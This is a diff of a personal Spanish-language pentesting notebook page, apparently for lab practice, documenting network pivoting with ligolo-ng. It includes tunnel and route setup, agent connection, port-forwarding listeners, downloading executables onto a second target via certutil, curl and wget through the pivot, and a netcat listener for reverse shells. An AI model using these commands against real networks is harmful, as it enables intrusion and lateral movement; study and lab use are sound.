@@ -7,15 +7,129 @@
     <link rel="stylesheet" href="/section.css" />
   </head>
   <body>
-    <main class="section-shell">
+    <main class="section-shell notebook-shell">
       <a class="back-link" href="/">~/home</a>
-      <section class="section-panel">
-        <p class="eyebrow">portfolio / notebook</p>
-        <h1>Notebook</h1>
-        <p>
-          Apuntes personales de pentesting, comandos, metodología,
-          troubleshooting, payloads, checklist y referencias útiles.
-        </p>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes">
+          <h1>Notebook</h1>
+
+          <nav class="vault-tree" aria-label="Ficheros">
+            <details class="vault-folder" open>
+              <summary>Pivoting</summary>
+              <a class="vault-file is-active" href="#ligolo">Ligolo</a>
+            </details>
+          </nav>
+        </aside>
+
+        <article class="note-panel" id="ligolo">
+          <div class="note-tabbar">
+            <span>Ligolo</span>
+            <span>~/notebook/Pivoting</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">pivoting / ligolo-ng</p>
+            <h2>Ligolo</h2>
+
+            <div class="note-kv">
+              <p><code>KALI:</code> <span class="ip-green">10.0.2.100</span></p>
+              <p><code>Target A:</code> <span class="ip-green">10.0.2.102</span> / <span class="ip-yellow">192.168.1.101</span></p>
+              <p><code>Target B:</code> <span class="ip-yellow">192.168.1.102</span></p>
+            </div>
+
+            <p><a href="https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.3">Ligolo Releases</a></p>
+
+            <section class="code-card">
+              <h3>Kali: Descomprimir Agente y Proxy</h3>
+              <pre><code># Descargar Ligolo proxy Linux AMD 64 (Kali)
+# Descargar Ligolo agent Linux/Windows (Dependiendo máquina pivot)
+7z -x comprimido.tar.gz
+7z -x comprimido.tar
+chmod +x proxy
+rm -f ligolo-ng_* # Eliminar todo lo que comience por ligolo-ng (son los comprimidos)</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Kali: Preparativos</h3>
+              <pre><code># Crear la Interfaz ligolo modo túnel
+sudo ip tuntap add user $USER mode tun ligolo
+# Activar Interfaz ligolo. Confirmar con ifconfig
+sudo ip link set ligolo up
+# Crear ruta hacia la &lt;red_pivoting/cidr&gt; 192.168.1.0/24
+sudo ip route add 172.16.121.0/24 dev ligolo</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Kali: Ejecutar proxy ligolo</h3>
+              <pre><code>./proxy -selfcert
+# -selfcert evita problema de certificados</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Target A: Ejecutar agent</h3>
+              <pre><code># Compartir y ejecutar agent en el Target A. (Linux agent añadir permisos de escritura)
+./agent -connect &lt;kali_ip&gt;:11601 -ignore-cert
+# Kali: Consola Ligolo
+session 1
+start</code></pre>
+            </section>
+
+            <aside class="callout danger">
+              <p>Ya podemos lanzar comandos como si estuviesemos en ese segmento de red desde Kali</p>
+              <pre><code>ping -c1 &lt;ip_target_b&gt;</code></pre>
+            </aside>
+
+            <h2>Portforwarding</h2>
+
+            <aside class="callout warning">
+              <p>Kali tiene visibilidad con la red externa pero el Target B de la red externa no tiene visibilidad con Kali.</p>
+              <p><strong>Transferencias de Archivos:</strong> abrir puerto 8080 de Target A para redirigir el tráfico al puerto 80 de Kali.</p>
+              <p><strong>Reverse Shells:</strong> abrir puerto 4443 de Target A para redirigir el tráfico al puerto 443 de Kali.</p>
+              <p>Puertos de portforwarding tienen que ser &gt; 1000.</p>
+            </aside>
+
+            <section class="code-card">
+              <h3>Kali (consola proxy ligolo)</h3>
+              <pre><code># --addr 0.0.0.0:8080 -&gt; Todo tráfico que reciba Target A por el puerto 8080 lo manda a Kali
+# --to 127.0.0.1:80   -&gt; Redirecciona el tráfico a Kali por el puerto 80
+listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
+listener_add --addr 0.0.0.0:4443 --to 127.0.0.1:443
+listener_list</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Transferir Ficheros</h3>
+              <pre><code># Kali
+python -m http.server 80
+# Target B Windows
+certutil -urlcache -f http://&lt;ip_target_a&gt;:8080/file.exe file.exe
+# Target B Linux
+curl -O http://&lt;ip_target_a&gt;:8080/file.txt
+wget http://&lt;ip_target_a&gt;:8080/file.txt</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Reverse Shells</h3>
+              <pre><code># Kali
+nc -nlvp 443
+# Target B
+# rev_shell: &lt;ip_target_a&gt;:4443</code></pre>
+            </section>
+
+            <h2>Limpieza</h2>
+
+            <section class="code-card">
+              <h3>Limpiar Configuración Pivoting</h3>
+              <pre><code># Borrar rutas
+ip route list
+sudo ip route del 172.16.121.0/24 dev ligolo
+# Borrar interfaz
+ifconfig
+sudo ip link del ligolo</code></pre>
+            </section>
+          </div>
+        </article>
       </section>
     </main>
   </body>
